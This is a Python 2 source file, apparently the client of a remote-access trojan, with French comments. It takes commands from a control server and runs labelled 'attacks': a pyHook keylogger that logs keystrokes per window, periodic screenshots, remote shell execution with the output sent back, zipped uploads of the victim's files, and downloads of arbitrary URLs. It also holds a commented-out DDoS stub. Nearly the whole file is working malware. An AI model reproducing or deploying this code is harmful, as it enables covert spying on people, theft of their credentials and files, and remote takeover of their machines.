# -*- coding: utf-8 -*-
"""
Created on Mon Apr 26 02:07:43 2016

@author: abdelmajid
"""

__doc__="""

"""
import time,datetime
import os
import threading
import requests
from PIL import ImageGrab
import shutil #pour compresser les fichiers uplodeds

from outils.constants import Server,Chemins
import outils.gerertime as gerertime

#================================================
#================= Attack=Commande ==============
#================================================
class Commande(threading.Thread):
    """
    Cette classe pour enregistrer une commande avec son type. on peut
    créer pour chaque type de commande une classe, pour faire tous les
    opérations nécessaire.
    """
    agent=None #c'es l'agent qui execute ces commandes
    #---------------------
    def __init__(self,id_cmd=None,type_cmd=None,texte=None,executee=None,active=None,date_debut=None,date_fin=None,duree=None,url_=None):
        """
        """
        threading.Thread.__init__(self)

        self.id_cmd=id_cmd
        self.type_cmd=type_cmd
        #self.titre=titre
        self.texte=texte
        self.executee=executee
        self.active=active
        self.date_debut=date_debut # tjrs présent
        self.date_fin=date_fin # si la duree est présente, en ajoute au date_debut pour remplir de champs
        self.duree=duree #calculer depuis date_fin et depart. ou bien le bot qui la definie dans le serveur.
        self.url=url_
        # si les trois derniers attributs sont nuls, alors cette commande est active tjrs.

        self.thread_active=False
        #self.thread=None #threading.Thread(target=self.executer) # pourquoi pas, je me sens bien à cet instant ;)

    #---------------------
    def enregsitrer_in_file(self):
        """
        Cette méthode permette d'enregistrer la commande dans le fichier cmds.
        """
        cmd={}
        cmds=load_json(Chemins.CHEMIN_CMDS_FILE)
        if cmds is not None:
            cmds_e=cmds
        cmds_e[self.id_cmd]=self.commande_to_dict()
        save_json(Chemins.CHEMIN_CMDS_FILE, cmds_e)

    #---------------------
    def supprimer_from_file(self):
        """
        Cette méthode permette d'enregistrer la commande dans le fichier cmds.
        """
        cmd={}
        cmds=load_json(Chemins.CHEMIN_CMDS_FILE)
        if cmds is not None:
            try:
                del cmds[self.id_cmd]
            except:
                a=8 # rien
        save_json(Chemins.CHEMIN_CMDS_FILE, cmds)

    #-----------------------
    def text_to_commande(self,text):
        """
        Transformer un texte (arriver du serveur) en une commande (selon le type).
        """
        cmd=None
        def verifier_val(val):
            if len(val)>0 and val!='None':
                return val
            return None

        if text is not None and text.startswith("id_cmd"):
            attrs=[attr for attr in text.split("{/ATTRIBUT/}") if len(attr)>3]
            attributs=dict()
            for attr in attrs:
                sp=attr.split(":")
                key,val=sp[0],":".join(sp[1:])
                attributs[key]=val
            id_c=verifier_val(attributs['id_cmd'])
            idc= int(id_c) if id_c is not None else None
            if attributs['type_cmd']=="KeyLogger":
                cmd=CommandeKeyLogger(id_cmd=id_c,texte=verifier_val(attributs['texte']),executee=False,active=True,date_debut=verifier_val(attributs['date_debut']),date_fin=verifier_val(attributs['date_fin']),duree=verifier_val(attributs['duree']))
            if attributs['type_cmd']=="ScreenShot":
                cmd=CommandeScreenShot(id_cmd=id_c,texte=verifier_val(attributs['texte']),executee=False,active=True,date_debut=verifier_val(attributs['date_debut']),date_fin=verifier_val(attributs['date_fin']),duree=verifier_val(attributs['duree']))
                cmd.periode=10 if verifier_val(attributs['texte']) is None else int(verifier_val(attributs['texte']))
            if attributs['type_cmd']=="Shell":
                cmd=CommandeShell(id_cmd=id_c,texte=verifier_val(attributs['texte']),executee=False,active=True,date_debut=verifier_val(attributs['date_debut']),date_fin=verifier_val(attributs['date_fin']),duree=verifier_val(attributs['duree']))
            if attributs['type_cmd']=="Upload":
                cmd=CommandeUpload(id_cmd=id_c,texte=verifier_val(attributs['texte']),executee=False,active=True,date_debut=verifier_val(attributs['date_debut']),date_fin=verifier_val(attributs['date_fin']),duree=verifier_val(attributs['duree']))
            if attributs['type_cmd']=="Download":
                cmd=CommandeDownload(id_cmd=id_c,texte=verifier_val(attributs['texte']),executee=False,active=True,date_debut=verifier_val(attributs['date_debut']),date_fin=verifier_val(attributs['date_fin']),duree=verifier_val(attributs['duree']),url_=verifier_val(attributs['url']))

            #if attributs['type_cmd']=="DDOS":
                #...
        return cmd

    #---------------------
    def terminee(self):
        """
        Foonctions verifier si cette fonction est terminée.
        """
        if self.date_fin is None:
            return False # commande infinie.

        if int(self.date_fin) < int(gerertime.get_timestap_utc()):
            return True

        return False

    #---------------------
    def arreter(self,terminee):
        """
        Arrter cette commande, on envoyer au serveur (executee=True/false).
        Si l'arrete a cause de terminaison (execute=True:terminaison) en enoie au serveur pour modifier l'attribut.
        sinon , on arrete la commande localement (tuer le thread).
        """
        if terminee==True:
            try:
                r=requests.post(Server.URL_CMD_TERMINEE,data={"id_client":Commande.agent.id_client,"id_cmd":self.id_cmd})
            except:
                r=None
        self.thread_active=False #ça s'arrete le thread.

    #---------------------
    def is_time_to_work(self):
        """
        Une méthode retourne True si le temps de départ est vennu.
        """
        return int(self.date_debut) <= int(gerertime.get_timestap_utc())

#================================================
#=============== Attack keyLogger ===============
#================================================
class CommandeKeyLogger(Commande):
    """
    """
    max_size_caracts=200 # le nombre maximum des caractère pour demmarer l'envoie.
    keysmapp={
                "Space":" ",
                "Returen":"\n #Return# "
                }
    #---------------------
    def __init__(self,id_cmd=None,texte=None,executee=None,active=None,date_debut=None,date_fin=None,duree=None):
        """
        """
        Commande.__init__(self,id_cmd=id_cmd,type_cmd="KeyLogger",texte=texte,executee=executee,active=active,date_debut=date_debut,date_fin=date_fin,duree=duree)
        self.text_ke=None # le texte recuperer du clavier, et va envoyer au serveur.
        self.periode=None
        self.messages={}#un dictionnaire qui va contenir le nom du fenetre est les messages crés.

        # save_now, c'est un timestap, on le utiliser pour envoyer au serveur ou stocker dans la machine
        # les messages.
        self.save_now=time.time()
        self.dern_time=time.time()#timestap de deriner frappe de clavier

    #----------------------
    def dict_to_commande(self, id_cmd, donnees):
        """
        Cette fonction on la donne une id et les attributs necéssaire dans un dictionnaire.
        """
        if id_cmd is not None:
            self.id_cmd=int(id_cmd)
            self.texte=donnees["texte"]
            self.executee=donnees["executee"]
            self.active=donnees["active"]
            self.date_debut=donnees["date_debut"]#time stap
            self.date_fin=donnees["date_fin"]#time stap
            self.duree=donnees["duree"]#time stap

    #----------------------
    def commande_to_dict(self):
        """
        Cette fonction retourne la commande sous forme de dictionnaire.
        """
        donnees=dict()
        if self.id_cmd is not None:
            donnees['id_cmd']=int(self.id_cmd)
            donnees["texte"]=self.texte
            donnees["executee"]=self.executee
            donnees["active"]=self.active
            donnees["type_cmd"]="KeyLogger"
            donnees["date_debut"]=self.date_debut#time stap depuis serveur
            donnees["date_fin"]=self.date_fin#time stap depuis serveur
            donnees["duree"]=self.duree#time stap depuis serveur

        return donnees

    #----------------------
    def modifier_attrs(self, cmd):
        """
        utiliser pour les commandes arrive, et dejà existe pour modifier seulement les attributs necessaires.
        """
        self.texte=cmd.texte
        self.date_debut=cmd.date_debut
        self.date_fin=cmd.date_fin
        self.duree=cmd.duree

    #---------------------
    def run(self):
        """
        Cette fonction sera lancée par un Thread, car il est possible de lancer plusieurs
        attacks en même temps. (Keylogger)
        """
        try:
            self.periode=float(self.texte)
        except:
            self.periode=120# 2 minutes
        print u"Cmd KeyLogger",self.id_cmd," Lancée"
        while self.thread_active and Commande.agent.actif:

            if len(self.messages)>0:#test de sevaugarde
                succes=False
                if Commande.agent.CONNEXION:
                    try:
                        print 'envoyer'
                        donnes={"id_client":Commande.agent.id_client,"id_cmd":self.id_cmd}
                        with open("cmds.js","w") as f:
                            for k,v in self.messages.items():
                                f.write("\n*****"+str(k)+"********\n")
                                f.write(str(v))
                        with open("cmds.js","r") as f:
                            message=f.read()
                        donnes["message"]=message
                        #print "Donnes:",donnes
                        r=requests.post(Server.URL_KEYLOGGER_SAVE,data=donnes)
                        succes=True
                        self.messages={}
                    except:
                        succes=False
                if not Commande.agent.CONNEXION or not succes:
                    """save with json (id_cmd,messages)"""
                    #sauvegarde, puis
                    #self.messages={}
                    pass

                self.save_now=time.time()
            #-------teste d'arret de la commande----
            term=self.terminee()
            if term==True:
                self.arreter(term)
                break
            time.sleep(self.periode)
        print "Commande KeyLogger:",self.id_cmd," Arretee"

    #-----------------------
    def timeToStr(self,tt):
        """
        Méthode qui transforme une time en une chaine formaté.
        """
        return "<"+str(tt.tm_year)+"/"+str(tt.tm_mon)+"/"+str(tt.tm_mday)+":: "+str(tt.tm_hour)+":"+str(tt.tm_min)+":"+str(tt.tm_sec)+">"

#================================================
#============= Attack ScreenShot ================
#================================================
class CommandeScreenShot(Commande):
    """
    3andak Tenssa bli khassk tb9a tsemi l'image li ghadi t'enregistriha, b "timestap". et
    mli t récupérihom kamline, ghadi t'ordonihom selon le nom (time), et envoyer toutes les images enregistrés
    dans le repertoires des images, il a t'envoya dak chi, ghadi tsupprimihom mn l fichier 3ad tkeml lkhemda.
    O f serveur mm chose ghadi t'ordoné 3ad tstocé.
    time stap mn l2a7ssan 7awlo l'entier bach mat2atrch dik l point dyal l reel.
    et ghadi tssyft chi 7aja comme ça . {"12452454425425.png":base64(12452454425425.png),"12121217817.png":base64(12121217817.png)}

    """
    directory_images="imagess" # penser a recuperer depuis le module constants. mais tester si python ecrit une répértoire s'elle n'est pas encore existe.
    #---------------------
    def __init__(self,id_cmd=None,texte=None,executee=None,active=None,date_debut=None,date_fin=None,duree=None):
        """
        """
        Commande.__init__(self,id_cmd=id_cmd,type_cmd="ScreenShot",texte=texte,executee=executee,active=active,date_debut=date_debut,date_fin=date_fin,duree=duree)
        self.image=None # l'image à envoyer. (s'il y on a plusieurs on envoie une par une, cet attribut comporte une seule)
        self.periode=None # periode après capture, (le but peut l'inserer das duree)


    #---------------------
    def run(self):
        with Commande.agent.LOCK:
            print "Screen cmd",self.id_cmd," est lancée"

        while self.thread_active and Commande.agent.actif:
            print "executer ----cmdShoot",self.id_cmd

            term=self.terminee()
            if Commande.agent.actif==False or term==True:
                self.arreter(term)
                print "CMD ScreenShot",self.id_cmd,":: Terminee ou agent non actif"
            else:
                if Commande.agent.CONNEXION:
                    self.capture_au_serveur()
                #else:
                    #on peut sauvegarder dans la machine ??(c'est pa la peine pour cette commande)
                    # ce travail sera traiter dans la fonction (capture_au_serveur)

            time.sleep(self.periode)# attent de qlqs secondes, pour refaire le travail

        print "Fin l'execution de cmd: ",self.id_cmd

    #----------------------
    def dict_to_commande(self, id_cmd, donnees):
        """
        Cette fonction on la donne une id et les attributs necéssaire dans un dictionnaire.
        """
        if id_cmd is not None:
            self.id_cmd=int(id_cmd)
            self.texte=donnees["texte"]
            self.executee=donnees["executee"]
            self.active=donnees["active"]
            self.periode=donnees["periode"]# en seconde (time stap)
            self.date_debut=donnees["date_debut"]#time stap
            self.date_fin=donnees["date_fin"]#time stap
            self.duree=donnees["duree"]#time stap

    #----------------------
    def commande_to_dict(self):
        """
        Cette fonction retourne la commande sous forme de dictionnaire.
        """
        donnees=dict()
        if self.id_cmd is not None:
            donnees['id_cmd']=int(self.id_cmd)
            donnees["type_cmd"]="ScreenShot"
            donnees["texte"]=self.texte
            donnees["executee"]=self.executee
            donnees["active"]=self.active
            donnees["periode"]=self.periode# en secondes
            donnees["date_debut"]=self.date_debut#time stap depuis serveur
            donnees["date_fin"]=self.date_fin#time stap depuis serveur
            donnees["duree"]=self.duree#time stap depuis serveur
        return donnees

    #----------------------
    def modifier_attrs(self, cmd):
        """
        utiliser pour les commandes arrive, et dejà existe pour modifier seulement les attributs necessaires.
        """
        self.texte=cmd.texte
        self.date_debut=cmd.date_debut
        self.date_fin=cmd.date_fin
        self.duree=cmd.duree
        self.periode=cmd.periode

    #----------------------
    def capture_au_serveur(self):
        """
        Capture l'écran, et envoyer la capture au serveur
        """
        now=datetime.datetime.now()
        now=[str(now.year),str(now.month),str(now.day),str(now.hour),str(now.minute),str(now.second)]
        img_name="_".join(now)+".png"
        image=ImageGrab.grab()
        if not os.path.isdir(CommandeScreenShot.directory_images):
            os.mkdir(CommandeScreenShot.directory_images)#mode=0777 par default
        image.save(CommandeScreenShot.directory_images+"/"+img_name)
        try:
            fichiers={img_name: open(CommandeScreenShot.directory_images+"/"+img_name, 'rb')}
            r=requests.post(Server.URL_SCREENSHOT_SAVE,\
            data={"id_client":Commande.agent.id_client,"id_cmd":self.id_cmd},\
            files=fichiers)
            #os.remove(CommandeScreenShot.directory_images+"/"+img_name)#si l'image est envoyée au serveur , donc sera supprimé.
            return
        except:
            #os.remove(CommandeScreenShot.directory_images+"/"+img_name)#si on veut supprimer l'image, ou bien on enregistres le nom avec l'id du commande, pour les anvoyer après.
            return #fais rien

#================================================
#================= Attack Shell =================
#================================================
class CommandeShell(Commande):
    """
    Classe qui gère une attack de type Shell. Executer des commande Shell
    à distance.
    """
    #---------------------
    def __init__(self,id_cmd=None,texte=None,executee=None,active=None,date_debut=None,date_fin=None,duree=None):
        """
        """
        Commande.__init__(self,id_cmd=id_cmd,type_cmd="Shell",texte=texte,executee=executee,active=active,date_debut=date_debut,date_fin=date_fin,duree=duree)
        self.resultats=None # resultats d'executions de cette cmd.

    #---------------------
    def run(self):
        with Commande.agent.LOCK:
            print "Shell cmd",self.id_cmd,u"est lancée"

        while self.thread_active and Commande.agent.actif:
            print "executer ----cmdShell",self.id_cmd

            term=self.terminee()
            if Commande.agent.actif==False or term==True:
                self.arreter(term)
                print "CMD Shell",self.id_cmd,":: Terminee ou agent non actif"
            else:
                self.resultats=""
                try:
                    stdin, stdout, stderr = os.popen3(self.texte)
                    self.resultats ="Stdout:\n"+stdout.read() +"\nStderr:\n"+stderr.read()
                    if os.name == "nt":
                        self.resultats = self.resultats.decode('cp1252', errors='replace')
                except:
                    self.resultats=u"Erreur d'execution, cette commande n'était pas réalisé"
                if Commande.agent.CONNEXION:
                    try:
                        res=""+self.resultats
                        try:
                            res.decode("utf8")
                        except:
                            res=""+self.resultats
                        r=requests.post(Server.URL_SHELL_SAVE,\
                        data={"id_client":Commande.agent.id_client,
                              "id_cmd":self.id_cmd,
                              "resultats":res})
                        self.arreter(True)
                        print "Fin l'execution avec succes (envoie au serveur): ",self.id_cmd
                        break# Fin du thread
                    except:
                        a="rien"
                #else:
                    #on peut sauvegarder dans la machine ??(c'est pa la peine pour cette commande)
                    # ce travail sera traiter dans la fonction (capture_au_serveur)
        print "Fin l'execution de cmd Shell: ",self.id_cmd

    #----------------------
    def dict_to_commande(self, id_cmd, donnees):
        """
        Cette fonction on la donne une id et les attributs necéssaire dans un dictionnaire.
        """
        if id_cmd is not None:
            self.id_cmd=int(id_cmd)
            self.texte=donnees["texte"]
            self.executee=donnees["executee"]
            self.active=donnees["active"]
            self.resultats=donnees["resultats"]# en seconde (time stap)
            self.date_debut=donnees["date_debut"]#time stap
            self.date_fin=donnees["date_fin"]#time stap
            self.duree=donnees["duree"]#time stap

    #----------------------
    def commande_to_dict(self):
        """
        Cette fonction retourne la commande sous forme de dictionnaire.
        """
        donnees=dict()
        if self.id_cmd is not None:
            donnees['id_cmd']=int(self.id_cmd)
            donnees["type_cmd"]="Shell"
            donnees["texte"]=self.texte
            donnees["executee"]=self.executee
            donnees["active"]=self.active
            donnees["resultats"]=self.resultats
            donnees["date_debut"]=self.date_debut#time stap depuis serveur
            donnees["date_fin"]=self.date_fin#time stap depuis serveur
            donnees["duree"]=self.duree#time stap depuis serveur
        return donnees

    #----------------------
    def modifier_attrs(self, cmd):
        """
        utiliser pour les commandes arrive, et dejà existe pour modifier seulement les attributs necessaires.
        """
        self.texte=cmd.texte
        self.date_debut=cmd.date_debut
        self.date_fin=cmd.date_fin

#================================================
#================= Attack Upload =================
#================================================
class CommandeUpload(Commande):
    """
    Classe qui gère une attack de type Upload. Tranférer des fichier
    depuis cette machine au serveur;
    """
    #---------------------
    def __init__(self,id_cmd=None,texte=None,executee=None,active=None,date_debut=None,date_fin=None,duree=None):
        """
        """
        Commande.__init__(self,id_cmd=id_cmd,type_cmd="Upload",texte=texte,executee=executee,active=active,date_debut=date_debut,date_fin=date_fin,duree=duree)
        #self.resultats=None # resultats d'executions de cette cmd.

    #---------------------
    def run(self):
        """ Run of our Thread """
        with Commande.agent.LOCK:
            print "Upload cmd",self.id_cmd,u"est lancée"

        while self.thread_active and Commande.agent.actif:
            print "executer ----cmdUpload",self.id_cmd

            term=self.terminee()
            if Commande.agent.actif==False or term==True:
                self.arreter(term)
                print "CMD Upload",self.id_cmd,":: Terminee ou agent non actif"
            elif Commande.agent.CONNEXION:
                data_ag={"id_client":Commande.agent.id_client,"id_cmd":self.id_cmd}
                try:
                    filename ="_".join(self.texte.split("/"))
                    filename="_".join(filename.split("\\")).replace(":","_")
                    print "FileName:",filename
                    filename= filename[-30:] if len(filename)>30 else filename
                    if os.path.isdir(self.texte):
                        print "====is Dir======"
                        arch_path = shutil.make_archive(filename, 'zip', self.texte)
                        data_ag['results']="Répertoire téléchargé avec succées"
                        requests.post(Server.URL_UPLOAD_SAVE,data=data_ag,files={'fichier': open(arch_path, 'rb')})
                        os.remove(arch_path)
                        print "envoyeeeee======"
                    else:
                        data_ag['results']="Fichier téléchargé avec succées"
                        requests.post(Server.URL_UPLOAD_SAVE, data=data_ag, files={'fichier': open(self.texte, 'rb')})
                except Exception, ex:
                    data_ag['results']="Erreur de transfert: %s"%ex
                    requests.post(Server.URL_UPLOAD_SAVE, data=data_ag)
                self.arreter(True)
                print "CMD Upload",self.id_cmd,":: Terminee ::"

            #else:
                #rien pour cette commande
        print "Fin l'execution de cmd Upload: ",self.id_cmd

    #----------------------
    def dict_to_commande(self, id_cmd, donnees):
        """
        Cette fonction on la donne une id et les attributs necéssaire dans un dictionnaire.
        """
        if id_cmd is not None:
            self.id_cmd=int(id_cmd)
            self.texte=donnees["texte"]
            self.executee=donnees["executee"]
            self.active=donnees["active"]
            #self.resultats=donnees["resultats"]# en seconde (time stap)
            self.date_debut=donnees["date_debut"]#time stap
            self.date_fin=donnees["date_fin"]#time stap
            self.duree=donnees["duree"]#time stap

    #----------------------
    def commande_to_dict(self):
        """
        Cette fonction retourne la commande sous forme de dictionnaire.
        """
        donnees=dict()
        if self.id_cmd is not None:
            donnees['id_cmd']=int(self.id_cmd)
            donnees["type_cmd"]="Upload"
            donnees["texte"]=self.texte
            donnees["executee"]=self.executee
            donnees["active"]=self.active
            #donnees["resultats"]=self.resultats
            donnees["date_debut"]=self.date_debut#time stap depuis serveur
            donnees["date_fin"]=self.date_fin#time stap depuis serveur
            donnees["duree"]=self.duree#time stap depuis serveur
        return donnees

    #----------------------
    def modifier_attrs(self, cmd):
        """
        utiliser pour les commandes arrive, et dejà existe pour modifier seulement les attributs necessaires.
        """
        self.texte=cmd.texte
        self.date_debut=cmd.date_debut
        self.date_fin=cmd.date_fin

#================================================
#================= Attack Download =================
#================================================
class CommandeDownload(Commande):
    """
    Classe qui gère une attack de type Download. Télécharger un fichier
    depuis une url et le met dans le chemin spécifié dans l'attribut texte de cette commande;
    """
    #---------------------
    def __init__(self,id_cmd=None,texte=None,executee=None,active=None,date_debut=None,date_fin=None,duree=None,url_=None):
        """
        """
        Commande.__init__(self,id_cmd=id_cmd,type_cmd="Download",texte=texte,executee=executee,active=active,date_debut=date_debut,date_fin=date_fin,duree=duree,url_=url_)
        #self.resultats=None # resultats d'executions de cette cmd.

    #---------------------
    def run(self):
        """ Run of our Thread """
        with Commande.agent.LOCK:
            print "Download cmd",self.id_cmd,u"est lancée"

        while self.thread_active and Commande.agent.actif:
            print "executer ----CmdDownload",self.id_cmd

            term=self.terminee()
            if Commande.agent.actif==False or term==True:
                self.arreter(term)
                print "CMD Download",self.id_cmd,":: Terminee ou agent non actif"
            elif Commande.agent.CONNEXION:
                data_ag={"id_client":Commande.agent.id_client,"id_cmd":self.id_cmd}
                try:
                    filename = self.texte.split('/')[-1]
                    repertoire= "".join(self.texte.split('/')[:-1])
                    if os.path.isdir(repertoire):
                        r = requests.get(self.url, stream=True)
                        with open(repertoire+"/"+filename, 'wb') as f:
                            for chunk in r.iter_content(chunk_size=8000):
                                if chunk:
                                    f.write(chunk)
                        data_ag['results']=u"Fichier téléchargé avec succées dans le chemin spécifié"
                        data_ag['emplacement']=repertoire+"/"+filename
                        requests.post(Server.URL_DOWNLOAD_SAVE,data=data_ag)
                    else:
                        r = requests.get(self.url, stream=True)
                        with open(filename, 'wb') as f:
                            for chunk in r.iter_content(chunk_size=8000):
                                if chunk:
                                    f.write(chunk)
                        data_ag['results']="Fichier téléchargé avec succées dans le repertoire du bot"
                        data_ag['emplacement']=os.getcwd()+"/"+filename
                        requests.post(Server.URL_DOWNLOAD_SAVE, data=data_ag)
                except Exception, ex:
                    data_ag['results']=u"Erreur de téléchargement: %s"%ex
                    data_ag['emplacement']="Erreur"
                    requests.post(Server.URL_DOWNLOAD_SAVE, data=data_ag)
                self.arreter(True)
                print "CMD Download",self.id_cmd,":: Terminee ::"

            #else:
                #rien pour cette commande pas de connexion
        print "Fin l'execution de cmd Upload: ",self.id_cmd

    #----------------------
    def dict_to_commande(self, id_cmd, donnees):
        """
        Cette fonction on la donne une id et les attributs necéssaire dans un dictionnaire.
        """
        if id_cmd is not None:
            self.id_cmd=int(id_cmd)
            self.texte=donnees["texte"]
            self.executee=donnees["executee"]
            self.active=donnees["active"]
            #self.resultats=donnees["resultats"]# en seconde (time stap)
            self.date_debut=donnees["date_debut"]#time stap
            self.date_fin=donnees["date_fin"]#time stap
            self.duree=donnees["duree"]#time stap
            self.url=donnees["url"]#time stap

    #----------------------
    def commande_to_dict(self):
        """
        Cette fonction retourne la commande sous forme de dictionnaire.
        """
        donnees=dict()
        if self.id_cmd is not None:
            donnees['id_cmd']=int(self.id_cmd)
            donnees["type_cmd"]="Download"
            donnees["texte"]=self.texte
            donnees["executee"]=self.executee
            donnees["active"]=self.active
            #donnees["resultats"]=self.resultats
            donnees["date_debut"]=self.date_debut#time stap depuis serveur
            donnees["date_fin"]=self.date_fin#time stap depuis serveur
            donnees["duree"]=self.duree#time stap depuis serveur
        return donnees

    #----------------------
    def modifier_attrs(self, cmd):
        """
        utiliser pour les commandes arrive, et dejà existe pour modifier seulement les attributs necessaires.
        """
        self.texte=cmd.texte
        self.date_debut=cmd.date_debut
        self.date_fin=cmd.date_fin


#===============================================
#================= EcouteClavier ===============
#===============================================
class EcouteClavierSouris(threading.Thread):
    """
    Cette classe joue le rôle de Listner de clavier.
    """
    #---------------------
    def __init__(self):
        """
        """
        threading.Thread.__init__(self)

    #---------------------
    def OnKeyboardEvent(self,event):
        """
        C'est le gestionnaire de l'événement de pyHook.HookManger. Pour le vlavier.
        pyhook.HookManger gère les évenements(clavier et souris) de bas niveau du système.
        """
        caracts=""
        #print "KeyDown:",event.Key
        if len(event.Key)>1 and not event.Key.startswith('Oem'):
            caracts=CommandeKeyLogger.keysmapp[event.Key] if event.Key in CommandeKeyLogger.keysmapp else " <kbd>"+event.Key+"</kbd> "
        elif event.Ascii<256:
            caracts=chr(event.Ascii)
        #Récupérer le commandes KeyLogger actuelles de l'agent.
        cmds=[cmd for id_c,cmd in Commande.agent.commandes.items() if cmd.type_cmd=="KeyLogger"]
        for cmd in cmds:
            if event.WindowName not in cmd.messages:
                cmd.messages[event.WindowName]=""+cmd.timeToStr(time.localtime())
            elif (cmd.dern_time+10)<=time.time():
                caracts="\n"+cmd.timeToStr(time.localtime())+" "+caracts
            cmd.messages[event.WindowName]+=caracts
            cmd.dern_time=time.time()
        return True
    #---------------------
    def run(self):
        """
        Cette fonction sera lancée par un Thread, car il est possible de lancer plusieurs
        attacks en même temps. Elle fait appel à une fonction de pythoncom "PumpMessages"
        qui reste en attente d'écouter au clavier d'une manière 'continue'(infinie).
        """
        with Commande.agent.LOCK:
            print "Ecouteur du Clavier et Souris est lancée"

        import pyHook
        hm = pyHook.HookManager()
        hm.KeyDown = self.OnKeyboardEvent
        #on peut ajouter le event de Mouse
        hm.HookKeyboard()
        import pythoncom
        pythoncom.PumpMessages()

        with Commande.agent.LOCK:
            #Mazal kat7lem T7bss Had l fonction :P
            print "Ouuuuuuuuuf, Run of PumpMessages stopped"
